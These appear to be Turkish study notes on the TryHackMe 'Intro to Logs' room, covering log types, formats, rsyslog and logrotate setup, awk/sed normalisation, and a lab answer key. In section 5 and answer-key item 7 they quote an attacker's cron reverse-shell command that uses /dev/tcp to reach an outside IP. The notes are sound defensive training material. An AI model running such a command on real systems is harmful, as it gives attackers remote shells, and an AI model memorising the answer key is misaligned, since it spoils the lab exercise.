# TryHackMe: Intro to Logs Notu

**Etiketler:** `#cybersecurity` `#soc-level-1` `#incident-response` `#detection-engineering` `#log-analysis` `#linux-internals` `#rsyslog` `#logrotate`

  

## 1. Mimari Yapı ve Temel Mantık

Loglar (günlük kayıtları), bir işletim sisteminde, ağ bileşeninde veya uygulamada gerçekleşen tüm olayların kronolojik dijital ayak izleridir (digital footprints). Bir ağ ihlali gerçekleştiğinde adli bilişim (forensics) ve olay müdahale (incident response) uzmanlarının elindeki en somut kanıt mekanizmasıdır.

  

```
+---------------------------------------------------------------------------------------------------+
|                                   LOG ANALİZ MİMARİSİ                                             |
+---------------------------------------------------------------------------------------------------+
|  [ VERİ KAYNAKLARI (DATA SOURCES) ]                                                               |
|  Web (Nginx/Apache), Auth/SSH (sshd), Scheduled Tasks (Cron), Apps (GitLab Rails), Syslog        |
+---------------------------------------------------------------------------------------------------+
                                            │
                                            ▼
|  [ TOPLAMA VE TAŞIMA (COLLECTION & TRANSPORT) ]                                                   |
|  - Zaman Senkronizasyonu: NTP (pool.ntp.org) -> Zaman çizelgesi doğruluğu                        |
|  - Log Toplayıcı / Aktarıcı: rsyslog (UDP/TCP yönlendirme, dosya bazlı kural filtreleme)          |
|  - Manuel / Alternatif Taşıma: scp, rsync                                                         |
+---------------------------------------------------------------------------------------------------+
                                            │
                                            ▼
|  [ YÖNETİM VE SAKLAMA (MANAGEMENT & STORAGE) ]                                                    |
|  - Döngü ve Sıkıştırma: logrotate (daily/hourly rotasyon, gzip sıkıştırma, SHA-256 hash alma)    |
|  - Katmanlı Saklama (Tiered Retention): Hot (3-6 Ay), Warm (6 Ay-2 Yıl), Cold (2-5 Yıl)           |
+---------------------------------------------------------------------------------------------------+
                                            │
                                            ▼
|  [ İŞLEME VE NORMALİZASYON (PARSING & NORMALISATION) ]                                            |
|  - CLI Araçları: awk, sed, grep, sort, uniq                                                       |
|  - Amacı: Ham ve heterojen logları tek bir zaman ve format standardına oturtmak                  |
+---------------------------------------------------------------------------------------------------+
                                            │
                                            ▼
|  [ KORELASYON, ZENGİNLEŞTİRME VE SIEM/LOG GÖRÜNTÜLEYİCİ ]                                         |
|  - SIEM / Analiz Araçları: Splunk, ElasticSearch (ELK), Log Viewer Web UI                        |
|  - Tespit & Müdahale: Tehdit İstihbaratı / IP Zenginleştirme, Kök Neden Analizi (RCA)            |
+---------------------------------------------------------------------------------------------------+
```

### Bağlamsal Korelasyonun (Contextual Correlation) Gücü

Tek bir log satırı tek başına anlamsız görünebilir. Ancak loglar toplanıp (aggregation), diğer kaynaklarla çapraz sorgulandığında (cross-referencing) şu 6 kritik soruyu yanıtlar:

  

1. **Ne oldu? (What happened?):** Örn. Saldırgan GitLab örneğine yetkisiz erişim sağladı.
    
      
    
2. **Ne zaman oldu? (When did it happen?):** Örn. 8 Eylül 2023, saat 22:10 UTC.
    
      
    
3. **Nerede gerçekleşti? (Where did it happen?):** Örn. VPN kullanıcı bloğundaki `10.10.133.168` IP'sinden kaynaklandı (`10.10.133.0/24`).
    
      
    
4. **Kim sorumludur? (Who is responsible?):** Örn. Belirli bir User-Agent (`Mozilla/5.0... Firefox/115.0`) kullanan istemci.
    
      
    
5. **Eylemleri başarılı oldu mu? (Were they successful?):** Örn. Açıkta kalan API anahtarı kullanılarak web shell yüklendi ve web proxy loglarıyla doğrulandı.
    
      
    
6. **Eylemin nihai sonucu ne oldu? (What was the result?):** Örn. `gitlab.swiftspend.finance` üzerinde Uzaktan Kod Çalıştırma (RCE) elde edildi ve sömürü sonrası (post-exploitation) aktiviteler yürütüldü.
    
      
    

## 2. Log Tipleri, Formatları ve Standartları

### Log Tipleri (Log Types)

|**Log Tipi**|**Kapsam ve Açıklama**|
|---|---|
|**Application Logs**|Belirli bir yazılıma ait durum iletileri, çalışma zamanı hataları, uyarılar ve özel uygulama olayları.|
|**Audit Logs**|Yasal düzenlemelere (compliance) uyum için kritik operasyonel prosedürlerin, erişimlerin ve idari işlemlerin kayıtları.|
|**Security Logs**|Kimlik doğrulama (başarılı/başarısız oturum açmalar), izin değişiklikleri, güvenlik duvarı (firewall) kuralları ve engellemeleri.|
|**Server Logs**|Sunucunun donanım, servis, sistem durumu, erişim ve hata aktivitelerini içeren genel log kümesi.|
|**System Logs**|Çekirdek (kernel) olayları, donanım durumları, sistem önyükleme (boot) süreçleri ve sistem seviyesi hatalar.|
|**Network Logs**|Ağ trafiği, oturum başlangıç/bitişleri, IP yönlendirmeleri ve ağ cihazı olayları.|
|**Database Logs**|Veritabanı sorguları (queries), şema güncellemeleri, transaction geçmişi ve veritabanı kullanıcı erişimleri.|
|**Web Server Logs**|Web sunucusu tarafından işlenen HTTP/HTTPS istekleri, istenen URL'ler, istemci IP'leri ve HTTP yanıt kodları.|

### Log Formatları (Log Formats)

|**Format Kategorisi**|**Format Adı**|**Tipik Kullanım Alanı**|**Yapısal Örnek**|
|---|---|---|---|
|**Semi-structured**|**Syslog Message Format**|Linux sistem ve ağ günlükleri|`May 31 12:34:56 WEBSRV-02 CRON[2342593]: (root) CMD ([ -x /etc/init.d/anacron ]...)`|
|**Semi-structured**|**Windows Event Log (EVTX)**|Microsoft Windows işletim sistemleri|İkili XML tabanlı yapı (`Get-WinEvent` ile okunur; Provider, Event ID, LevelDisplayName içerir).|
|**Structured**|**CSV / TSV (Field Delimited)**|Tablosal veriler, ayrıştırılabilir metinler|`"time","user","action","status","ip","uri"`|
|**Structured**|**JSON**|Modern web uygulamaları, API'ler, ELK|`{"time": "...", "user": "adversary", "action": "GET", "status": 200, "ip": "..."}`|
|**Structured**|**W3C Extended Log Format (ELF)**|Microsoft IIS Web Server|`#Fields: date time c-ip c-username s-ip s-port cs-method cs-uri-stem sc-status`<br><br>  <br>  <br><br>`31-May-2023 13:55:36 34.253.159.159 adversary 34.253.127.157 80 GET /explore 200`|
|**Structured**|**XML**|Standartlaştırılmış kurumsal sistemler|`<log><time>...</time><user>adversary</user><action>GET</action><status>200</status></log>`|
|**Unstructured**|**NCSA Common Log Format (CLF)**|Apache HTTP Server (varsayılan)|`34.253.159.159 - adversary [31/May/2023:13:55:36 +0000] "GET /explore HTTP/1.1" 200 4886`|
|**Unstructured**|**NCSA Combined Log Format**|Nginx HTTP Server (varsayılan)|CLF alanlarına ek olarak `Referrer` ve `User-Agent` barındırır:<br><br>  <br>  <br><br>`34.253.159.159 - adversary [31/May/2023:13:55:36 +0000] "GET /explore HTTP/1.1" 200 4886 "http://gitlab.swiftspend.finance/" "Mozilla/5.0..."`|

### Log Standartları ve Kılavuzlar (Log Standards)

|**Standart / Kılavuz**|**Geliştirici / Kurum**|**Açıklama ve Kapsam**|**Bağlantı / Referans**|
|---|---|---|---|
|**Common Event Expression (CEE)**|MITRE|Log verileri için ortak yapı sağlayarak üretim, aktarım, depolama ve analizi kolaylaştıran standart.|[MITRE CEE](https://cee.mitre.org/)|
|**OWASP Logging Cheat Sheet**|OWASP|Geliştiricilere güvenli uygulama loglama mekanizmaları kurma rehberi sunar.|[OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/)|
|**Syslog Protocol (RFC 5424)**|IETF|Mesaj üreten, depolayan ve analiz eden sistemlerin ayrıştırılmasını sağlayan mesajlaşma standardı.|[IETF RFC 5424](https://datatracker.ietf.org/doc/html/rfc5424)|
|**NIST SP 800-92**|NIST|Bilgisayar güvenlik log yönetimi kılavuzu (politikalar, mimariler ve operasyonel süreçler).|[NIST SP 800-92](https://csrc.nist.gov/publications/detail/sp/800-92/final)|
|**Azure Monitor Logs**|Microsoft|Microsoft Azure bulut ortamlarında log izleme ve saklama prensipleri.|[Azure Monitor Documentation](https://learn.microsoft.com/en-us/azure/azure-monitor/)|
|**Google Cloud Logging**|Google|Google Cloud Platform (GCP) üzerindeki log mimarisi ve analiz kuralları.|[GCP Logging](https://cloud.google.com/logging)|
|**OCI Logging**|Oracle|Oracle Cloud Infrastructure için merkezi log yönetim standartları.|[OCI Logging Service](https://docs.oracle.com/en-us/iaas/Content/Logging/Concepts/loggingoverview.htm)|
|**Virginia Tech IT Logging Standard**|Virginia Tech|Kurumsal log inceleme, denetim ve regülasyon uyum standartları örneği.|[Virginia Tech IT Standards](https://it.vt.edu/)|

## 3. Log Analiz Süreci (Log Analysis Pipeline)

```
[Data Sources] ──> [Parsing] ──> [Normalisation] ──> [Sorting] ──> [Classification] ──> [Enrichment] ──> [Correlation] ──> [Visualisation] ──> [Reporting]
```

1. **Veri Kaynakları (Data Sources):** Log üretiminin başladığı sistemler (işletim sistemleri, ağ cihazları, veritabanları, API'ler).
    
      
    
2. **Ayrıştırma (Parsing):** Ham log metnini yapılandırılmış bileşenlere (zaman damgası, kullanıcı adı, hedef IP, durum kodu) bölme işlemi.
    
      
    
3. **Normalizasyon (Normalisation):** Farklı kaynaklardan gelen ayrıştırılmış verileri ortak bir veri tipine ve alan isimlendirme şemasına dönüştürme süreci.
    
      
    
4. **Sıralama (Sorting):** Verilerin kronolojik zaman, kaynak, önem derecesi (severity) veya olay türüne göre dizilerek anomali tespitinin hızlandırılması.
    
      
    
5. **Sınıflandırma (Classification):** Logların kritiklik derecesine (Info, Warning, Error, Critical) veya olay kategorisine göre etiketlenmesi.
    
      
    
6. **Zenginleştirme (Enrichment):** Log satırına bağlam ekleme (GeoIP coğrafi konum bilgisi, Threat Intelligence / Tehdit İstihbaratı IP/domain itibar puanı, LDAP kullanıcı bilgileri).
    
      
    
7. **Korelasyon (Correlation):** Görünüşte bağımsız olan log girdileri arasındaki nedensellik ve bağımlılık bağlarını kurarak çok aşamalı saldırıları ortaya çıkarma.
    
      
    
8. **Görselleştirme (Visualisation):** Logların ısı haritaları (heat maps), zaman serisi grafikleri ve gösterge panelleri (dashboards) ile somutlaştırılması.
    
      
    
9. **Raporlama (Reporting):** Denetçiler (auditors), SOC yöneticileri veya adli merciler için log bulgularının özet metinlere ve uyumluluk tablolarına dönüştürülmesi.
    
      
    

## 4. Log Saklama ve Rotasyon Stratejisi (Retention & Deletion)

### Saklama Katmanları (Tiered Retention)

```
  ┌────────────────────────────────────────────────────────────────────────┐
  │ HOT STORAGE: 3 - 6 Ay                                                  │
  │ • En yüksek erişilebilirlik, SSD/bellek tabanlı hızlı indeksleme.     │
  │ • Neredeyse gerçek zamanlı (near real-time) SIEM sorgulamaları.        │
  └────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │ WARM STORAGE: 6 Ay - 2 Yıl                                             │
  │ • Data lake mimarisi, daha düşük maliyetli depolama.                   │
  │ • İhtiyaç anında sorgulanabilir ancak yanıt süreleri Hot'a göre yavaş.  │
  └────────────────────────────────────────────────────────────────────────┘
                                     │
                                     ▼
  ┌────────────────────────────────────────────────────────────────────────┐
  │ COLD STORAGE: 2 - 5 Yıl                                                │
  │ • Arşivlenmiş, sıkıştırılmış (gzip/bzip2) veya teyp/derin bulut alanı. │
  │ • Anlık sorgulanamaz; yalnızca geriye dönük adli inceleme içindir.     │
  └────────────────────────────────────────────────────────────────────────┘
```

> [!WARNING]
> 
> **Adli Bilişim Uyarısı (Chain of Custody & Hash Alma):**
> 
> Bir saldırı anında veya log silme/arşivleme öncesinde log dosyasının kriptografik özeti (`sha256sum`) alınmalıdır. Mahkemelerde delil geçerliliği (admissibility in court) ve delil zinciri bütünlüğü (data integrity), log dosyasının değiştirilmediğinin bu hash değerleriyle doğrulanmasına bağlıdır.
> 
>   

## 5. Uygulama: rsyslog ve logrotate Konfigürasyonu

### rsyslog ile SSH Olaylarını Yakalama

`rsyslog`, Linux çekirdeği ve servis mesajlarını filtreleyip yerel dosyalara veya merkezi SIEM sunucularına aktaran gelişmiş bir sistem günlüğü servisidir.

  

Bash

```
# rsyslog servisinin aktifliğini kontrol et
sudo systemctl status rsyslog

# SSH için yeni bir rsyslog kural dosyası oluştur
sudo nano /etc/rsyslog.d/98-websrv-02-sshd.conf
```

Aşağıdaki yapılandırmayı dosyaya ekleyin:

  

Plaintext

```
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
```

- **`$FileCreateMode 0644`:** Oluşturulacak yeni log dosyasının dosya izinlerini belirler (sahibine okuma-yazma, gruba ve diğerlerine sadece okuma hakkı).
    
      
    
- **`:programname, isequal, "sshd"`:** Logu üreten sürecin adı tam olarak `sshd` ise filtre uygular.
    
      
    
- **`/var/log/websrv-02/rsyslog_sshd.log`:** Eşleşen olayların yönlendirileceği hedef log dosyası yolu.
    
      
    

Bash

```
# Yapılandırmayı devreye almak için servisi yeniden başlat
sudo systemctl restart rsyslog

# Yapılandırmayı test etmek için localhost'a SSH bağlantısı dene
ssh localhost
```

### Cron Loglarının SIEM'e İletilmesi (Senaryo Analizi)

VM üzerindeki `/etc/rsyslog.d/99-websrv-02-cron.conf` dosyasında cron kayıtlarının uzaktaki SIEM sunucusuna aktarıldığı görülmektedir:

  

Bash

```
cat /etc/rsyslog.d/99-websrv-02-cron.conf
```

- **SIEM Hedef IP:** `10.10.10.101`
    
      
    
- **Cron Log Dosyası:** `/var/log/websrv-02/rsyslog_cron.log`
    
      
    

Bu log dosyasında yakalanan kritik saldırgan faaliyeti:

  

Plaintext

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
```

> [!NOTE]
> 
> **Tersine Kabuk (Reverse Shell) Analizi:**
> 
> Saldırgan cron içerisine interaktif bir bash kabuğu yerleştirmiştir. `34.253.159.159` adresinin `9999` portuna `/dev/tcp` soketi üzerinden bağlanarak `root` yetkileriyle ters bağlantı elde etmektedir.
> 
>   

### logrotate ile Otomasyon ve Kriptografik Doğrulama

Logların kontrolsüz büyümesini önlemek ve disk alanını korumak için `logrotate` kullanılır.

  

Bash

```
# logrotate yapılandırma dosyasını oluştur
sudo nano /etc/logrotate.d/98-websrv-02_sshd.conf
```

Yapılandırma betiği:

  

Plaintext

```
/var/log/websrv-02/rsyslog_sshd.log {
    daily
    rotate 30
    compress
    lastaction
        DATE=$(date +"%Y-%m-%d")
        echo "$(date)" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
        for i in $(seq 1 30); do
            FILE="/var/log/websrv-02/rsyslog_sshd.log.$i.gz"
            if [ -f "$FILE" ]; then
                HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')
                echo "rsyslog_sshd.log.$i.gz "$HASH"" >> "/var/log/websrv-02/hashes_"$DATE"_rsyslog_sshd.txt"
            fi
        done
        systemctl restart rsyslog
    endscript
}
```

#### Satır Satır Parametre Analizi:

- **`daily`:** Rotasyonun günlük olarak çalıştırılacağını belirtir.
    
      
    
- **`rotate 30`:** Sistemde en fazla 30 adet eski arşiv kopyasının saklanacağını, 31. kopyada en eskisinin silineceğini tanımlar.
    
      
    
- **`compress`:** Döndürülen eski log dosyalarını `gzip` formatında `.gz` olarak sıkıştırır.
    
      
    
- **`lastaction ... endscript`:** Rotasyon tamamlandıktan hemen sonra çalıştırılacak shell komutları bloğu.
    
      
    
- **`DATE=$(date +"%Y-%m-%d")`:** O günün tarihini `YYYY-AA-GG` formatında bir değişkene atar.
    
      
    
- **`for i in $(seq 1 30); do ... done`:** 1'den 30'a kadar tüm sıkıştırılmış log kopyalarını döngüye alır.
    
      
    
- **`if [ -f "$FILE" ]; then ... fi`:** Dosyanın diskte var olup olmadığını teyit eder.
    
      
    
- **`HASH=$(/usr/bin/sha256sum "$FILE" | awk '{ print $1 }')`:** Sıkıştırılmış arşiv dosyasının SHA-256 özet değerini hesaplar ve sadece hash çıktısını değişkene alır.
    
      
    
- **`echo ... >> hashes_...txt`:** Hesaplanan hash değerini tarih bazlı doğrulama dosyasına yazar.
    
      
    
- **`systemctl restart rsyslog`:** Log dosyası döndürüldükten sonra rsyslog sürecini yeni dosyaya yazması için yeniden başlatır.
    
      
    

Bash

```
# Yapılandırmayı zorla (force) tetikleyerek test et
sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf
```

## 6. Linux Komut Satırında Log İşleme ve Normalizasyon

Farklı kaynaklardan gelen heterojen log formatlarını tek bir zaman damgası ve dosya referansı altında birleştirmek için `awk`, `sed`, `grep`, `sort` ve `uniq` kullanılır.

  

Bash

```
# 1. Nginx Erişim Logunu Ayrıştır ve Standartlaştır
awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log | sed "s/ +0000//g" > /tmp/parsed_consolidated.log

# 2. Cron Logunu Ayrıştır ve Aynı Formatta Dosyaya Ekle
awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_cron.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_cron.log >> /tmp/parsed_consolidated.log

# 3. SSHD Logunu Ayrıştır ve Eklemeye Devam Et
awk '{ original_line = $0; gsub(/ /, "/", $1); printf "[%s/%s/2023:%s] --- /var/log/websrv-02/rsyslog_sshd.log --- \"%s\"\n", $2, $1, $3, original_line }' /var/log/websrv-02/rsyslog_sshd.log >> /tmp/parsed_consolidated.log

# 4. JSON Formatındaki API Logunu Unix Zaman Damgasına Çevirerek Birleştir
awk -F'"' '{timestamp = $4; converted = strftime("[%d/%b/%Y:%H:%M:%S]", mktime(substr(timestamp, 1, 4) " " substr(timestamp, 6, 2) " " substr(timestamp, 9, 2) " " substr(timestamp, 12, 2) " " substr(timestamp, 15, 2) " " substr(timestamp, 18, 2) " 0 0")); print converted, "--- /var/log/gitlab/gitlab-rails/api_json.log ---", "\""$0"\""}' /var/log/gitlab/gitlab-rails/api_json.log >> /tmp/parsed_consolidated.log

# 5. Belirli Bir IP Adresine Odaklanmak İçin Filtreleme (Zenginleştirme Öncesi)
grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log

# 6. Tüm Logları Kronolojik Olarak Sırala
sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log

# 7. Tekrarlayan Satırları Temizle
uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log
```

### Parametre ve Komut İşlevleri:

- **`awk -F'[][]'`:** Köşeli parantezleri (`[` ve `]`) alan ayracı (delimiter) olarak tanımlar; böylece NCSA loglarındaki `[tarih]` verisini `$2` olarak doğrudan çeker.
    
      
    
- **`sed "s/ +0000//g"`:** Zaman damgası sonundaki saat dilimi ofsetini (`+0000`) kaldırarak standart metin formatı elde eder.
    
      
    
- **`gsub(/ /, "/", $1)`:** `$1` alanındaki boşluk karakterlerini `/` karakterine dönüştürür.
    
      
    
- **`mktime(...)` ve `strftime(...)`:** ISO-8601 biçimindeki JSON zaman damgasını parçalayıp NCSA standardına dönüştürür.
    
      
    
- **`sort`:** Verileri varsayılan olarak alfabetik/sayısal artan sırada dizer (zaman damgası başta olduğu için kronolojik sıralama sağlar).
    
      
    
- **`uniq`:** Birbirini takip eden mükerrer (duplicate) satırları eler.
    
      
    

> [!TIP]
> 
> **Ad-hoc SOC Analist İpucu:**
> 
> Ham log dosyalarını bir web arayüzünde görüntülerken formatlar homojen değilse filtreler çalışmayabilir. Örneğin ham cron logunda geçerli bir ISO veya Apache formatında tarih alanı bulunmadığı için filtreleme motoru **"No date field"** hatası üretir. `awk`/`sed` ile yapılan normalizasyon işlemi bu hatayı ortadan kaldırır.
> 
>   

## 7. Pratik ve Laboratuvar Soru-Cevap Anahtarı

|**#**|**Soru (Metin İçi Soru Tanımı)**|**Doğru Cevap**|**Teknik Açıklama / Dayanak**|
|---|---|---|---|
|**1**|What is the name of your colleague who left a note on your Desktop?|`Perry`|Kullanıcı masaüstündeki inceleme notunu bırakan iş arkadaşı.|
|**2**|What is the full path to the suggested log file for initial investigation?|`/var/log/gitlab/nginx/access.log`|Notta ilk analiz için önerilen Nginx web erişim log yolu.|
|**3**|Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?|`Web Server Log`|Nginx bir web sunucusudur ve erişim logları bu sınıfa girer.|
|**4**|Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?|`Combined`|Nginx varsayılan olarak Referrer ve User-Agent içeren NCSA Combined formatını kullanır.|
|**5**|After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at `/var/log/websrv-02/rsyslog_sshd.log`, indicating failed login attempts or brute forcing?|`stansimon`|SSH brute-force girişimlerinde sürekli tekrarlanan kullanıcı adı.|
|**6**|What is the IP address of SIEM-02 based on the rsyslog configuration file `/etc/rsyslog.d/99-websrv-02-cron.conf`, which is used to monitor cron messages?|`10.10.10.101`|Cron loglarının yönlendirildiği hedef SIEM sunucusunun IP adresi.|
|**7**|Based on the generated logs in `/var/log/websrv-02/rsyslog_cron.log`, what command is being executed by the root user?|`/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"`|Cron tablosuna enjekte edilmiş olan saldırganın Reverse Shell komutu.|
|**8**|Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, how many versions of old compressed log file copies will be kept?|`24`|`rotate 24` parametresi gereğince saklanan eski kopya sayısı.|
|**9**|Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, what is the log rotation frequency?|`hourly`|Yapılandırma dosyasındaki rotasyon sıklığı direktifi.|
|**10**|Upon accessing the log viewer URL for unparsed raw log files, what error does `/var/log/websrv-02/rsyslog_cron.log` show when selecting the different filters?|`No date field`|Ham logda standart zaman damgası alanı bulunmadığından filtre arayüzünün verdiği hata.|
|**11**|What is the process of standardising parsed data into a more easily readable and query-able format?|`Normalisation`|Ayrıştırılmış veriyi standart formata getirme adımı.|
|**12**|What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?|`Enrichment`|Belirli bir IP adresine yönelik logları bağlamsal olarak güçlendirme süreci.|

## 8. Tekrar Kategorisi ve 3 Dakikalık Pazar Stratejisi

- **Sınıf:** 🔴 **Kırmızı (Pratik / Komut / Payload Hatırlaması)**
    
      
    
- **Gerekçe:** rsyslog filtre sözdizimi (`:programname, isequal`), logrotate blok mimarisi (`lastaction` içindeki SHA-256 otomasyon döngüsü) ve Linux boru hattı (`awk -F'[][]'`, `sed`, `sort`, `uniq`) doğrudan pratik komut kas hafızası gerektirir.
    
      
    

### ⏱️ Pazar Günü 3 Dakikalık Tekrar Stratejisi

1. **Dakika 00:00 - 01:00 (rsyslog & logrotate blokları):**
    
      
    - Gözünle `/etc/rsyslog.d/` kural yapısını (`$FileCreateMode 0644`, `:programname, isequal, "servis" /hedef/yol`) canlandır.
        
          
        
    - `logrotate` içindeki `rotate`, `compress` ve delil bütünlüğü için `lastaction` içine gömülen `sha256sum` script mantığını hatırla.
        
          
        
2. **Dakika 01:00 - 02:00 (CLI Boru Hattı):**
    
      
    - `awk -F'[][]'` ifadesinin neden köşeli parantezi parçaladığını (NCSA logundaki tarihi almak için) zihinsel olarak doğrula.
        
          
        
    - `sort` ve `uniq` kombinasyonunun adli analizde neden birlikte çalıştığını tekrar et.
        
          
        
3. **Dakika 02:00 - 03:00 (Adli Kavramlar):**
    
      
    - **Hot (3-6 Ay)** vs **Warm (6 Ay-2 Yıl)** vs **Cold (2-5 Yıl)** saklama sürelerini ve tersine kabuk (reverse shell) soket parametrelerini (`/dev/tcp/IP/PORT`) tara.